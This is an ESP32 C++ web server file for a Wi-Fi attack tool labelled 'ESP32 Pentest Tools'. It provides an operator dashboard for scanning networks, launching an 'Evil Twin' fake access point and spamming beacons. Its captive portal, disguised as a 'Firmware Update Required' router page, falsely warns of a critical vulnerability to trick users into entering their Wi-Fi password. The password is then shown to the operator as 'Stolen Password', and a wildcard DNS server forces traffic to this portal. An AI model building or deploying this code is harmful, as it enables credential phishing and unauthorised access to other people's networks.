#include "web_server.h"
#include "attacks.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <WiFi.h>

WebServer server(80);
DNSServer dnsServer;
String stolen_password = "None";
bool attack_active = false;

const char* dashboard_html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ESP32 Pentest Dashboard</title>
<style>
body{font-family:sans-serif;background:#1e1e1e;color:#fff;text-align:center;padding:20px;}
h1{color:#00ffcc;} .card{background:#2a2a2a;padding:20px;border-radius:10px;max-width:500px;margin:20px auto;}
input, select{padding:10px;border-radius:5px;border:none;margin:5px;width:90%;}
button{padding:12px 20px;border-radius:5px;border:none;cursor:pointer;font-weight:bold;margin:5px;width:95%;}
.btn-red{background:#ff4444;color:white;} .btn-blue{background:#4444ff;color:white;} .btn-green{background:#44aa44;color:white;}
.btn-scan{background:#ffaa00;color:black; font-weight: bold;}
</style></head><body>
<h1>ESP32 Pentest Tools</h1>

<div class="card">
    <h3>Auto Evil Twin</h3>
    <button class="btn-scan" onclick="scanNetworks()">1. Scan Networks</button>
    <br><br>
    <select id="target_select">
        <option value="">-- Select a network --</option>
    </select>
    <br><br>
    <button class="btn-red" onclick="startAutoEvilTwin()">2. Start Evil Twin</button>
</div>

<div class="card">
    <h3>Beacon Spam</h3>
    <input type="text" id="spam_name" placeholder="Base Name (e.g., Free_WiFi_)">
    <input type="number" id="spam_count" placeholder="Count (e.g., 50)">
    <br><button class="btn-blue" onclick="startSpam()">Start Spam</button>
</div>

<div class="card">
    <h3>Stop All</h3>
    <button class="btn-green" onclick="stopAll()">Stop & Reset</button>
</div>

<div class="card">
    <h3>Stolen Password</h3>
    <h2 style="color:#ffcc00;" id="stolen_pass">Loading...</h2>
</div>

<script>
function scanNetworks() {
    document.getElementById('target_select').innerHTML = '<option>Scanning... wait 5s</option>';
    fetch('/scan').then(r=>r.text()).then(t=>{
        document.getElementById('target_select').innerHTML = t;
    });
}
function startAutoEvilTwin() {
    let val = document.getElementById('target_select').value;
    if(!val) { alert("Please scan and select a network first!"); return; }
    fetch('/start_auto_eviltwin?data=' + encodeURIComponent(val));
    alert("Evil Twin Started!");
}
function startSpam() {
    let name = document.getElementById('spam_name').value;
    let count = document.getElementById('spam_count').value;
    fetch('/start_spam?name='+name+'&count='+count);
}
function stopAll() { fetch('/stop'); }
setInterval(()=>{ fetch('/get_pass').then(r=>r.text()).then(t=>document.getElementById('stolen_pass').innerText=t); }, 2000);
</script></body></html>
)rawliteral";

const char* portal_html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Router Update</title>
<style>
body{font-family:sans-serif;background:#f4f6f8;color:#333;text-align:center;padding:50px;}
.card{background:#fff;padding:30px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.1);max-width:400px;margin:auto;}
h1{color:#d9534f;} input{padding:12px;width:80%;margin:10px;border:1px solid #ccc;border-radius:5px;}
button{background:#1a56db;color:white;padding:12px 20px;border:none;border-radius:5px;width:88%;cursor:pointer;font-size:16px;}
.progress{width:100%;height:5px;background:#e2e8f0;margin-bottom:20px;border-radius:3px;}
.progress-bar{width:0%;height:100%;background:#1a56db;transition:width 0.5s;}
</style></head><body>
<div class="card">
    <h1>⚠️ Firmware Update Required</h1>
    <div class="progress"><div class="progress-bar" id="bar"></div></div>
    <p>A critical security vulnerability was found in your router. Enter your Wi-Fi password to authorize the update.</p>
    <form action="/submit_password" method="GET">
        <input type="password" name="password" placeholder="Enter Wi-Fi Password" required>
        <button type="submit">Update Router</button>
    </form>
</div>
<script>let p=0; setInterval(()=>{ if(p<100){p+=5; document.getElementById('bar').style.width=p+'%';} },500);</script></body></html>
)rawliteral";

void handleRoot() { server.send(200, "text/html", dashboard_html); }
void handlePortal() { server.send(200, "text/html", portal_html); }

void handleScan() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    String options = "";
    for (int i = 0; i < n; ++i) {
        String ssid = WiFi.SSID(i);
        int ch = WiFi.channel(i);
        String bssid = WiFi.BSSIDstr(i);
        if(ssid.length() > 0) {
            String value = bssid + "," + ssid + "," + String(ch);
            options += "<option value='" + value + "'>" + ssid + " (" + bssid + ")</option>";
        }
    }
    if(options == "") options = "<option value=''>No networks found</option>";
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free_WiFi_Update", "");
    
    server.send(200, "text/html", options);
}

void handleAutoEvilTwin() {
    if (server.hasArg("data")) {
        String data = server.arg("data");
        int c1 = data.indexOf(',');
        int c2 = data.indexOf(',', c1 + 1);
        
        if (c1 > 0 && c2 > 0) {
            String bssidStr = data.substring(0, c1);
            String ssid = data.substring(c1 + 1, c2);
            int ch = data.substring(c2 + 1).toInt();
            
            uint8_t bssid[6];
            sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
            
            startEvilTwin(ssid, bssid, ch);
            attack_active = true;
            server.send(200, "text/plain", "Started");
            return;
        }
    }
    server.send(400, "text/plain", "Error");
}

void handleSubmitPassword() {
    if (server.hasArg("password")) {
        stolen_password = server.arg("password");
        Serial.println("Pass: " + stolen_password);
    }
    server.send(200, "text/html", "<h1>Thank you! Router Updated.</h1>");
}

void handleStartSpam() {
    if (server.hasArg("name") && server.hasArg("count")) {
        startBeaconSpam(server.arg("name"), server.arg("count").toInt());
        server.send(200, "text/plain", "Spam Started");
    } else {
        server.send(400, "text/plain", "Missing Parameters");
    }
}

void handleStop() {
    stopAllAttacks();
    attack_active = false;
    server.send(200, "text/plain", "Stopped");
}

void handleGetPass() { server.send(200, "text/plain", stolen_password); }

void handleNotFound() {
    if (attack_active) {
        server.sendHeader("Location", "/portal", true);
        server.send(302, "text/plain", "");
    } else {
        server.send(404, "text/plain", "Not Found");
    }
}

void initWebServer() {
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", handleRoot);
    server.on("/portal", handlePortal);
    server.on("/submit_password", handleSubmitPassword);
    server.on("/scan", handleScan);
    server.on("/start_auto_eviltwin", handleAutoEvilTwin);
    server.on("/start_spam", handleStartSpam);
    server.on("/stop", handleStop);
    server.on("/get_pass", handleGetPass);
    server.onNotFound(handleNotFound);
    server.begin();
}

void handleWebServer() {
    dnsServer.processNextRequest();
    server.handleClient();
}
